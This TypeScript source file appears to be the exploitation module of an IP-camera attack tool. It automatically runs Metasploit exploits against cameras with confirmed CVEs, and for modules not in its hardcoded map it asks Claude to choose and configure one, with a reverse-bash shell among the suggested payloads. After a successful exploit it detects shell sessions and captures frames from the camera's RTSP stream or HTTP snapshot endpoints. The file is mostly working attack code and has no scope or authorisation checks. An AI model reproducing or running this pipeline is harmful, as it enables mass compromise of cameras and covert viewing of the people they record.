import { spawn } from 'node:child_process';
import { promises as fs } from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import Anthropic from '@anthropic-ai/sdk';
import type {
  FingerprintResult,
  CveModuleResult,
  ExploitationResult,
  ExploitationModuleResult,
  VeilcamsConfig,
  CameraVendor,
} from '../types/index.js';
import { CVE_MSF_MAP, type MsfModuleConfig } from '../constants-msf.js';
import { DEFAULTS, RTSP_PATHS, SNAPSHOT_ENDPOINTS } from '../constants.js';

let aiClient: Anthropic | null = null;

function getAiClient(): Anthropic {
  if (!aiClient) {
    const apiKey = process.env.ANTHROPIC_API_KEY;
    if (!apiKey) {
      throw new Error('ANTHROPIC_API_KEY environment variable is required for AI exploitation');
    }
    aiClient = new Anthropic({ apiKey });
  }
  return aiClient;
}

/**
 * Phase 3.5: Exploitation
 *
 * Auto-exploits confirmed CVEs via Metasploit (msfconsole).
 * For each confirmed CVE:
 *   1. Check hardcoded map for known-good module configs (fast path)
 *   2. If not in map, search Metasploit DB via `msfconsole -q -x "search cve:<ID>"`
 *   3. Use AI (Claude) to pick the best module and configure it
 *   4. Generate .rc resource script and execute
 *   5. Capture screenshot evidence on success
 */
export async function runExploitation(
  fingerprints: FingerprintResult[],
  cveResult: CveModuleResult,
  config: VeilcamsConfig,
  outputDir: string,
): Promise<ExploitationModuleResult> {
  const startTime = Date.now();
  const results: ExploitationResult[] = [];

  if (!config.exploitation.enabled) {
    return {
      results: [],
      totalAttempts: 0,
      successfulExploits: 0,
      failedExploits: 0,
      skippedNoModule: 0,
      durationMs: Date.now() - startTime,
    };
  }

  // Build a lookup for fingerprint data by ip:port
  const fpMap = new Map<string, FingerprintResult>();
  for (const fp of fingerprints) {
    fpMap.set(`${fp.ip}:${fp.port}`, fp);
  }

  // Collect all confirmed CVEs (hardcoded + AI)
  const confirmedCves = cveResult.results.filter((r) => r.vulnerable);
  const confirmedAi = (cveResult.aiResults || []).filter((r) => r.vulnerable);
  let skippedNoModule = 0;

  const totalConfirmed = confirmedCves.length + confirmedAi.length;
  console.log(`[exploitation] ${totalConfirmed} confirmed CVEs to evaluate for exploitation`);

  if (!config.exploitation.auto_exploit_confirmed) {
    return {
      results: [],
      totalAttempts: 0,
      successfulExploits: 0,
      failedExploits: 0,
      skippedNoModule: totalConfirmed,
      durationMs: Date.now() - startTime,
    };
  }

  // Ensure tmp dir for resource scripts
  const rcDir = path.join(os.tmpdir(), 'veilcams_rc');
  await fs.mkdir(rcDir, { recursive: true });

  // Batch search Metasploit for all CVE IDs that aren't in the hardcoded map
  const cveIdsToSearch = new Set<string>();
  for (const cve of confirmedCves) {
    if (!CVE_MSF_MAP[cve.cveId]) cveIdsToSearch.add(cve.cveId);
  }
  for (const ai of confirmedAi) {
    if (!CVE_MSF_MAP[ai.cveId]) cveIdsToSearch.add(ai.cveId);
  }

  // Search Metasploit for all unknown CVEs in one batch
  const msfSearchResults = new Map<string, string>();
  if (cveIdsToSearch.size > 0) {
    console.log(`[exploitation] Searching Metasploit for ${cveIdsToSearch.size} CVEs not in hardcoded map...`);
    const searchOutput = await searchMsfModules([...cveIdsToSearch]);
    // Parse per-CVE results from the batch output
    for (const cveId of cveIdsToSearch) {
      const cvePattern = new RegExp(`--- ${cveId} ---([\\s\\S]*?)(?=--- CVE-|$)`);
      const match = searchOutput.match(cvePattern);
      if (match && match[1]) {
        msfSearchResults.set(cveId, match[1].trim());
      }
    }
  }

  // Process hardcoded CVE results
  const exploitedKeys = new Set<string>();

  for (const cve of confirmedCves) {
    const result = await exploitCve(cve.cveId, cve.ip, cve.port, cve.vendor, cve.severity, fpMap, msfSearchResults, config, rcDir, outputDir);
    if (result === 'skipped') {
      skippedNoModule++;
    } else {
      results.push(result);
      exploitedKeys.add(`${cve.cveId}:${cve.ip}:${cve.port}`);
    }
  }

  // Process AI CVE results (skip duplicates)
  for (const ai of confirmedAi) {
    const key = `${ai.cveId}:${ai.ip}:${ai.port}`;
    if (exploitedKeys.has(key)) continue;

    const result = await exploitCve(ai.cveId, ai.ip, ai.port, ai.vendor, ai.severity, fpMap, msfSearchResults, config, rcDir, outputDir);
    if (result === 'skipped') {
      skippedNoModule++;
    } else {
      results.push(result);
    }
  }

  const successful = results.filter((r) => r.success).length;
  const failed = results.filter((r) => !r.success).length;

  // Save raw results
  const resultsPath = path.join(outputDir, 'raw', 'exploitation_results.json');
  await fs.mkdir(path.dirname(resultsPath), { recursive: true });
  await fs.writeFile(resultsPath, JSON.stringify(results, null, 2));

  const moduleResult: ExploitationModuleResult = {
    results,
    totalAttempts: results.length,
    successfulExploits: successful,
    failedExploits: failed,
    skippedNoModule,
    durationMs: Date.now() - startTime,
  };

  console.log(`[exploitation] Complete: ${successful} successful, ${failed} failed, ${skippedNoModule} skipped (no module)`);

  return moduleResult;
}

/**
 * Exploit a single CVE on a target.
 * Returns 'skipped' if no module could be found/configured, otherwise the result.
 */
async function exploitCve(
  cveId: string,
  ip: string,
  port: number,
  vendor: string,
  severity: string,
  fpMap: Map<string, FingerprintResult>,
  msfSearchResults: Map<string, string>,
  config: VeilcamsConfig,
  rcDir: string,
  outputDir: string,
): Promise<ExploitationResult | 'skipped'> {
  const timeout = config.exploitation.timeout_per_exploit || DEFAULTS.EXPLOITATION_TIMEOUT_MS;

  // 1. Check hardcoded map first (known-good configs, no AI call needed)
  let msfConfig: MsfModuleConfig | undefined = CVE_MSF_MAP[cveId];

  // 2. If not in hardcoded map, use AI to resolve from msf search results
  if (!msfConfig) {
    const searchOutput = msfSearchResults.get(cveId);
    if (!searchOutput || searchOutput.includes('No results')) {
      console.log(`[exploitation] ${cveId} on ${ip}:${port} — no Metasploit module found, skipping`);
      return 'skipped';
    }

    console.log(`[exploitation] ${cveId} on ${ip}:${port} — found modules in Metasploit, asking AI to configure...`);
    const fp = fpMap.get(`${ip}:${port}`);

    try {
      const aiResult = await aiSelectModule(cveId, ip, port, vendor, severity, searchOutput, fp);
      if (!aiResult) {
        console.log(`[exploitation] ${cveId} on ${ip}:${port} — AI could not determine a suitable module`);
        return 'skipped';
      }
      msfConfig = aiResult;
    } catch (error) {
      console.log(`[exploitation] ${cveId} on ${ip}:${port} — AI module selection failed: ${(error as Error).message}`);
      return 'skipped';
    }
  }

  console.log(`[exploitation] Exploiting ${cveId} on ${ip}:${port} via ${msfConfig.module}`);

  const result = await runMsfExploit(ip, port, cveId, vendor, msfConfig, timeout, rcDir);

  // Capture screenshot evidence after successful exploit
  if (result.success) {
    console.log(`[exploitation] ${cveId} on ${ip}:${port} — SUCCESS, capturing screenshot...`);
    const fp = fpMap.get(`${ip}:${port}`);
    result.screenshotPath = await captureScreenshot(ip, port, vendor as CameraVendor, fp, outputDir);
    if (result.screenshotPath) {
      console.log(`[exploitation] Screenshot saved: ${result.screenshotPath}`);
    }
  } else {
    console.log(`[exploitation] ${cveId} on ${ip}:${port} — FAILED: ${result.error || 'no session'}`);
  }

  return result;
}

// ─── Metasploit Search ──────────────────────────────────────────

/**
 * Search Metasploit for modules matching given CVE IDs.
 * Runs a single msfconsole session with all search commands batched.
 */
async function searchMsfModules(cveIds: string[]): Promise<string> {
  const commands = cveIds.map((id) =>
    `echo "--- ${id} ---"; search cve:${id.replace('CVE-', '')}`
  ).join('; ');

  return new Promise((resolve) => {
    const proc = spawn('msfconsole', ['-q', '-x', `${commands}; exit`], {
      stdio: ['ignore', 'pipe', 'pipe'],
      env: { ...process.env, TERM: 'dumb' },
    });

    let stdout = '';

    proc.stdout.on('data', (data: Buffer) => {
      stdout += data.toString();
    });

    // 2 min timeout for the batch search
    const timer = setTimeout(() => {
      proc.kill('SIGTERM');
      setTimeout(() => proc.kill('SIGKILL'), 5000);
      resolve(stdout);
    }, 120_000);

    proc.on('close', () => {
      clearTimeout(timer);
      resolve(stdout);
    });

    proc.on('error', () => {
      clearTimeout(timer);
      resolve('');
    });
  });
}

// ─── AI Module Selection ────────────────────────────────────────

/**
 * Ask Claude to pick the best Metasploit module from search results
 * and return a properly configured MsfModuleConfig.
 */
async function aiSelectModule(
  cveId: string,
  ip: string,
  port: number,
  vendor: string,
  severity: string,
  msfSearchOutput: string,
  fingerprint: FingerprintResult | undefined,
): Promise<MsfModuleConfig | null> {
  const client = getAiClient();

  const targetContext = fingerprint
    ? `Vendor: ${fingerprint.vendor}, Model: ${fingerprint.model || 'unknown'}, Firmware: ${fingerprint.firmware || 'unknown'}, Auth: ${fingerprint.authType}, Protocols: ${fingerprint.protocols.join(', ')}, Server: ${fingerprint.serverHeader || 'unknown'}`
    : `Vendor: ${vendor}, IP: ${ip}, Port: ${port}`;

  const prompt = `You are a penetration testing assistant. Given a confirmed CVE and Metasploit search results, select the best module and configure it.

CVE: ${cveId}
Severity: ${severity}
Target: ${ip}:${port}
Target Info: ${targetContext}

Metasploit search results:
${msfSearchOutput}

Respond with ONLY a JSON object (no markdown, no explanation):
{
  "module": "full/module/path",
  "type": "exploit" or "auxiliary",
  "defaultPayload": "payload/path" or null,
  "options": { "OPTION_NAME": "value" },
  "timeout": 60000
}

Rules:
- Pick the module most likely to work against this specific target
- For exploits, choose a safe payload like "cmd/unix/generic" with CMD "id", or "cmd/unix/reverse_bash" if a reverse shell makes more sense
- Set RHOSTS and RPORT in the options — they'll be overridden, but include them for completeness
- For auxiliary modules, set defaultPayload to null
- If none of the search results are applicable to this target, respond with: null
- Do NOT wrap the JSON in markdown code fences`;

  try {
    const response = await client.messages.create({
      model: 'claude-sonnet-4-5-20250929',
      max_tokens: 500,
      messages: [{ role: 'user', content: prompt }],
    });

    const text = response.content
      .filter((block): block is Anthropic.TextBlock => block.type === 'text')
      .map((block) => block.text)
      .join('');

    const trimmed = text.trim();
    if (trimmed === 'null' || trimmed === '') return null;

    const parsed = JSON.parse(trimmed);
    if (!parsed || !parsed.module) return null;

    return {
      module: parsed.module,
      type: parsed.type === 'exploit' ? 'exploit' : 'auxiliary',
      defaultPayload: parsed.defaultPayload || undefined,
      options: parsed.options || {},
      vendors: [vendor as CameraVendor],
      timeout: parsed.timeout || 60_000,
    };
  } catch (error) {
    console.log(`[exploitation] AI module selection error for ${cveId}: ${(error as Error).message}`);
    return null;
  }
}

// ─── Exploit Execution ──────────────────────────────────────────

/**
 * Generate a Metasploit resource script and execute it via msfconsole.
 */
async function runMsfExploit(
  ip: string,
  port: number,
  cveId: string,
  vendor: string,
  msfConfig: MsfModuleConfig,
  timeout: number,
  rcDir: string,
): Promise<ExploitationResult> {
  const exploitStart = Date.now();
  const rcFilename = `veilcams_${cveId.replace(/[^a-zA-Z0-9-]/g, '_')}_${ip.replace(/\./g, '_')}_${port}.rc`;
  const rcPath = path.join(rcDir, rcFilename);

  // Build resource script
  const rcLines: string[] = [];
  rcLines.push(`use ${msfConfig.module}`);
  rcLines.push(`set RHOSTS ${ip}`);
  rcLines.push(`set RPORT ${port}`);

  if (msfConfig.defaultPayload) {
    rcLines.push(`set PAYLOAD ${msfConfig.defaultPayload}`);
  }

  for (const [key, value] of Object.entries(msfConfig.options)) {
    // Skip RHOSTS/RPORT in options — already set above
    if (key === 'RHOSTS' || key === 'RPORT') continue;
    rcLines.push(`set ${key} ${value}`);
  }

  if (msfConfig.type === 'exploit') {
    rcLines.push('exploit');
  } else {
    rcLines.push('run');
  }

  rcLines.push('exit');
  rcLines.push('');

  await fs.writeFile(rcPath, rcLines.join('\n'));

  // Execute msfconsole
  try {
    const output = await runMsfConsole(rcPath, timeout);

    // Parse output for success indicators
    const sessionCreated = /session \d+ opened/i.test(output) ||
      /command shell session \d+ opened/i.test(output) ||
      /meterpreter session \d+ opened/i.test(output);

    const auxiliarySuccess = msfConfig.type === 'auxiliary' && (
      /\[\+\]/.test(output) ||
      /login.*successful/i.test(output) ||
      /found/i.test(output)
    );

    const success = sessionCreated || auxiliarySuccess;

    let sessionType: string | undefined;
    if (sessionCreated) {
      const meterMatch = output.match(/meterpreter session/i);
      const shellMatch = output.match(/command shell session/i);
      sessionType = meterMatch ? 'meterpreter' : shellMatch ? 'shell' : 'unknown';
    }

    // Clean up rc file
    await fs.unlink(rcPath).catch(() => {});

    return {
      cveId,
      ip,
      port,
      vendor: vendor as ExploitationResult['vendor'],
      msfModule: msfConfig.module,
      msfModuleType: msfConfig.type,
      success,
      output,
      sessionCreated,
      sessionType,
      durationMs: Date.now() - exploitStart,
      timestamp: new Date().toISOString(),
    };
  } catch (error) {
    // Clean up rc file
    await fs.unlink(rcPath).catch(() => {});

    return {
      cveId,
      ip,
      port,
      vendor: vendor as ExploitationResult['vendor'],
      msfModule: msfConfig.module,
      msfModuleType: msfConfig.type,
      success: false,
      output: '',
      sessionCreated: false,
      error: (error as Error).message,
      durationMs: Date.now() - exploitStart,
      timestamp: new Date().toISOString(),
    };
  }
}

// ─── Screenshot Capture ─────────────────────────────────────────

/**
 * Capture a screenshot from the exploited camera as visual evidence.
 *
 * Tries two methods:
 * 1. ffmpeg RTSP frame grab — connects to known RTSP paths for the vendor
 * 2. HTTP snapshot endpoint — curls known snapshot URLs
 *
 * Returns the path to the saved screenshot, or undefined if capture failed.
 */
async function captureScreenshot(
  ip: string,
  port: number,
  vendor: CameraVendor,
  fingerprint: FingerprintResult | undefined,
  outputDir: string,
): Promise<string | undefined> {
  const screenshotDir = path.join(outputDir, 'evidence', 'screenshots');
  await fs.mkdir(screenshotDir, { recursive: true });

  const filename = `exploit_${ip.replace(/\./g, '_')}_${port}_${Date.now()}`;

  // Try RTSP frame capture via ffmpeg
  const rtspPaths = [
    ...(RTSP_PATHS[vendor] || []),
    ...RTSP_PATHS.unknown,
  ];
  // Use RTSP port — check if the fingerprint has RTSP, otherwise try 554
  const rtspPort = fingerprint?.protocols.includes('rtsp') ? port : 554;

  for (const rtspPath of rtspPaths.slice(0, 5)) {
    const rtspUrl = `rtsp://${ip}:${rtspPort}${rtspPath}`;
    const outputPath = path.join(screenshotDir, `${filename}_rtsp.jpg`);

    try {
      const captured = await ffmpegCapture(rtspUrl, outputPath);
      if (captured) {
        console.log(`[exploitation] RTSP screenshot captured from ${rtspUrl}`);
        return outputPath;
      }
    } catch {
      // Try next path
    }
  }

  // Try HTTP snapshot endpoints
  const snapshotPaths = [
    ...(SNAPSHOT_ENDPOINTS[vendor] || []),
    ...SNAPSHOT_ENDPOINTS.unknown,
  ];
  const scheme = fingerprint?.protocols.includes('https') ? 'https' : 'http';

  for (const snapPath of snapshotPaths.slice(0, 5)) {
    const url = `${scheme}://${ip}:${port}${snapPath}`;
    const outputPath = path.join(screenshotDir, `${filename}_http.jpg`);

    try {
      const captured = await curlCapture(url, outputPath);
      if (captured) {
        console.log(`[exploitation] HTTP screenshot captured from ${url}`);
        return outputPath;
      }
    } catch {
      // Try next endpoint
    }
  }

  console.log(`[exploitation] Could not capture screenshot from ${ip}:${port}`);
  return undefined;
}

/**
 * Use ffmpeg to grab a single frame from an RTSP stream.
 */
function ffmpegCapture(rtspUrl: string, outputPath: string): Promise<boolean> {
  return new Promise((resolve) => {
    const proc = spawn('ffmpeg', [
      '-y',
      '-rtsp_transport', 'tcp',
      '-i', rtspUrl,
      '-frames:v', '1',
      '-q:v', '2',
      outputPath,
    ], {
      stdio: ['ignore', 'pipe', 'pipe'],
      timeout: 15000,
    });

    const timer = setTimeout(() => {
      proc.kill('SIGTERM');
      resolve(false);
    }, 15000);

    proc.on('close', async (code) => {
      clearTimeout(timer);
      if (code === 0) {
        // Verify the file exists and has content
        try {
          const stats = await fs.stat(outputPath);
          resolve(stats.size > 1000); // Minimum 1KB for a valid JPEG
        } catch {
          resolve(false);
        }
      } else {
        resolve(false);
      }
    });

    proc.on('error', () => {
      clearTimeout(timer);
      resolve(false);
    });
  });
}

/**
 * Use curl to download a snapshot from an HTTP endpoint.
 */
function curlCapture(url: string, outputPath: string): Promise<boolean> {
  return new Promise((resolve) => {
    const proc = spawn('curl', [
      '-s',
      '-o', outputPath,
      '-m', '10',
      '--insecure',
      url,
    ], {
      stdio: ['ignore', 'pipe', 'pipe'],
    });

    const timer = setTimeout(() => {
      proc.kill('SIGTERM');
      resolve(false);
    }, 15000);

    proc.on('close', async (code) => {
      clearTimeout(timer);
      if (code === 0) {
        try {
          const stats = await fs.stat(outputPath);
          if (stats.size < 1000) {
            await fs.unlink(outputPath).catch(() => {});
            resolve(false);
            return;
          }
          // Check if it looks like an image (JPEG magic bytes)
          const header = Buffer.alloc(3);
          const fd = await fs.open(outputPath, 'r');
          await fd.read(header, 0, 3, 0);
          await fd.close();
          const isJpeg = header[0] === 0xFF && header[1] === 0xD8 && header[2] === 0xFF;
          const isPng = header[0] === 0x89 && header[1] === 0x50 && header[2] === 0x4E;
          if (isJpeg || isPng) {
            resolve(true);
          } else {
            await fs.unlink(outputPath).catch(() => {});
            resolve(false);
          }
        } catch {
          resolve(false);
        }
      } else {
        resolve(false);
      }
    });

    proc.on('error', () => {
      clearTimeout(timer);
      resolve(false);
    });
  });
}

// ─── Metasploit Console ─────────────────────────────────────────

/**
 * Spawn msfconsole with a resource script and capture output.
 */
function runMsfConsole(rcPath: string, timeout: number): Promise<string> {
  return new Promise((resolve, reject) => {
    const proc = spawn('msfconsole', ['-q', '-r', rcPath], {
      stdio: ['ignore', 'pipe', 'pipe'],
      env: { ...process.env, TERM: 'dumb' },
    });

    let stdout = '';
    let stderr = '';

    proc.stdout.on('data', (data: Buffer) => {
      stdout += data.toString();
    });

    proc.stderr.on('data', (data: Buffer) => {
      stderr += data.toString();
    });

    const timer = setTimeout(() => {
      proc.kill('SIGTERM');
      // Give it a moment to clean up, then force kill
      setTimeout(() => proc.kill('SIGKILL'), 5000);
      resolve(stdout + '\n[TIMEOUT] Exploit timed out after ' + timeout + 'ms');
    }, timeout);

    proc.on('close', (code) => {
      clearTimeout(timer);
      if (code !== 0 && !stdout) {
        reject(new Error(`msfconsole exited with code ${code}: ${stderr}`));
      } else {
        resolve(stdout);
      }
    });

    proc.on('error', (err) => {
      clearTimeout(timer);
      reject(new Error(`Failed to launch msfconsole: ${err.message}`));
    });
  });
}
